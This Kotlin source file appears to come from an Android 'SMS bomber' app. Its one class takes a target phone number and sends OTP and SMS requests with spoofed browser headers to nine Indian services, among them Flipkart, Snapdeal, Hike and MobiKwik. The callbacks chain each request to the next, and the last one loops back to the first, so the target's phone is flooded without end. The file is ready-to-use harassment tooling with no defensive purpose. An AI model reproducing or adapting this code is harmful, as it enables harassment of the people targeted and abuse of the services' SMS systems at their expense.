package co.deucate.smsbomber

import okhttp3.*
import org.json.JSONObject
import java.io.IOException
import java.util.HashMap

class DataHalper(private val mPhoneNumber:String){

    fun flipkart() {
        val localOkHttpClient = OkHttpClient()
        val localRequestBody = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "loginId=%2B91$mPhoneNumber")
        localOkHttpClient.newCall(Request.Builder().url("https://www.flipkart.com/api/5/user/otp/generate").post(localRequestBody).addHeader("host", "www.flipkart.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.flipkart.com/").addHeader("x-user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("origin", "https://www.flipkart.com").addHeader("content-length", "21").addHeader("cookie", mPhoneNumber).addHeader("connection", "keep-alive").build()).enqueue(object : Callback {
            override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
                homeshop18()
                HomeActivity().dataChange("Err: Failure in homeshop18")
            }

            override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
                HomeActivity().updateStatus("Flipkart")
                homeshop18()
            }
        })

    }

    private fun homeshop18() {
        val localOkHttpClient1 = OkHttpClient()
        val localRequestBody1 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "submit=submit&identity=$mPhoneNumber&otpType=SIGNUP_OTP")
        localOkHttpClient1.newCall(Request.Builder().url("https://mbe.homeshop18.com/services/secure/user/generate/otp").post(localRequestBody1).addHeader("x-hs18-app-version", "3.1.0").addHeader("x-hs18-app-id", "0").addHeader("x-hs18-device-version", "25").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("accept-charset", "UTF-8").addHeader("x-hs18-app-platform", "androidApp").build()).enqueue(object : Callback {
            override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
                HomeActivity().dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                snapdeal()
            }

            override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
                HomeActivity().updateStatus("Homeshop18")
                snapdeal()
            }
        })
    }

    private fun snapdeal() {
        val localOkHttpClient2 = OkHttpClient()
        val localRequestBody2 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "emailId=&mobileNumber=$mPhoneNumber&purpose=LOGIN_WITH_MOBILE_OTP")
        localOkHttpClient2.newCall(Request.Builder().url("https://www.snapdeal.com/sendOTP")
                .post(localRequestBody2).addHeader("host", "www.snapdeal.com")
                .addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0")
                .addHeader("accept", "*/*").addHeader("accept-language", "en-US,en;q=0.5")
                .addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.snapdeal.com/iframeLogin")
                .addHeader("content-type", "application/x-www-form-urlencoded").addHeader("x-requested-with", "XMLHttpRequest")
                .addHeader("content-length", "62").addHeader("connection", "keep-alive").build()).enqueue(object : Callback {
            override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
                HomeActivity().dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                goibibo()
            }

            override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
                HomeActivity().updateStatus("Snapdeal")
                goibibo()
            }
        })
    }

    private fun goibibo() {
        val localOkHttpClient3 = OkHttpClient()
        val localRequestBody3 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mbl=$mPhoneNumber")
        localOkHttpClient3.newCall(Request.Builder().url("https://www.goibibo.com/common/downloadsms/").post(localRequestBody3).addHeader("host", "www.goibibo.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://www.goibibo.com/mobile/?sms=success").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("content-length", "14").addHeader("connection", "keep-alive").addHeader("upgrade-insecure-requests", "1").build()).enqueue(object : Callback {
            override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
                HomeActivity().dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                piasabazar()
            }

            override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
                HomeActivity().updateStatus("Goibibo")
                piasabazar()
            }
        })
    }

    private fun piasabazar() {
        val localOkHttpClient11 = OkHttpClient()
        val localRequestBody11 = RequestBody.create(MediaType.parse("application/x-www-form-urlencoded"), "mobile_number=$mPhoneNumber&step=send_password&request_page=landing")
        localOkHttpClient11.newCall(Request.Builder().url("https://myaccount.paisabazaar.com/my-account/").post(localRequestBody11).addHeader("host", "myaccount.paisabazaar.com").addHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0").addHeader("accept", "application/json, text/javascript, */*; q=0.01").addHeader("accept-language", "en-US,en;q=0.5").addHeader("accept-encoding", "gzip, deflate, br").addHeader("referer", "https://myaccount.paisabazaar.com/my-account/").addHeader("content-type", "application/x-www-form-urlencoded").addHeader("x-requested-with", "XMLHttpRequest").addHeader("content-length", "64").addHeader("connection", "keep-alive").build()).enqueue(object : Callback {
            override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
                HomeActivity().dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                justdial()
            }

            override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
                HomeActivity().updateStatus("Paisabazaar")
                justdial()
            }
        })
    }

    private fun justdial() {
        val str = "https://www.justdial.com/functions/ajxandroid.php?phn=$mPhoneNumber&em=e.g.+abc%40xyz.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile"
        OkHttpClient().newCall(Request.Builder().url(str).addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36").build()).enqueue(object : Callback {
            override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
                HomeActivity().dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                hike()
            }

            override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
                HomeActivity().updateStatus("Justdial")
                hike()
            }
        })
    }

    private fun hike() {
        val localMediaType0 = MediaType.parse("application/json; charset=utf-8")
        val localHashMap0 = HashMap<String, Any>()
        localHashMap0["method"] = "pin"
        localHashMap0["msisdn"] = "+91$mPhoneNumber"
        val localJSONObject121 = JSONObject(localHashMap0)
        val localOkHttpClient121 = OkHttpClient()
        val localRequestBody121 = RequestBody.create(localMediaType0, localJSONObject121.toString())
        localOkHttpClient121.newCall(Request.Builder().url("http://api.im.hike.in/v3/account/validate?digits=4").post(localRequestBody121).addHeader("content-type", "application/json; charset=utf-8").build()).enqueue(object : Callback {
            override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
                HomeActivity().dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                mobikwick()
            }

            override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
                HomeActivity().updateStatus("Hike")
                mobikwick()
            }
        })
    }

    private fun mobikwick() {
        val localMediaType001 = MediaType.parse("application/json; charset=utf-8")
        val localHashMap001 = HashMap<String, Any>()
        localHashMap001["cell"] = mPhoneNumber
        val localJSONObject001 = JSONObject(localHashMap001)
        val localOkHttpClient001 = OkHttpClient()
        val localRequestBody001 = RequestBody.create(localMediaType001, localJSONObject001.toString())
        localOkHttpClient001.newCall(Request.Builder().url("https://appapi.mobikwik.com/p/account/otp/cell").post(localRequestBody001).addHeader("content-type", "application/json").addHeader("User-Agent", "").addHeader("X-App-Ver", "1").addHeader("X-MClient", "1").build()).enqueue(object : Callback {
            override fun onFailure(paramAnonymousCall: Call, paramAnonymousIOException: IOException) {
                HomeActivity().dataChange("Err: "+paramAnonymousIOException.localizedMessage)
                confirmTKT()
            }

            override fun onResponse(paramAnonymousCall: Call, paramAnonymousResponse: Response) {
                HomeActivity().updateStatus("MobiKWICK")
                confirmTKT()
            }
        })
    }

    private fun confirmTKT() {
        val client = OkHttpClient()
        val request = Request.Builder().url("https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=$mPhoneNumber").build()
        val call = client.newCall(request)
        call.enqueue(object : Callback {
            override fun onFailure(call: Call?, e: IOException?) {
                HomeActivity().dataChange("Err: "+e!!.localizedMessage)
                flipkart()
            }

            override fun onResponse(call: Call?, response: Response?) {
                HomeActivity().updateStatus("ConfirmTKT")
                flipkart()
            }
        })

    }
    
}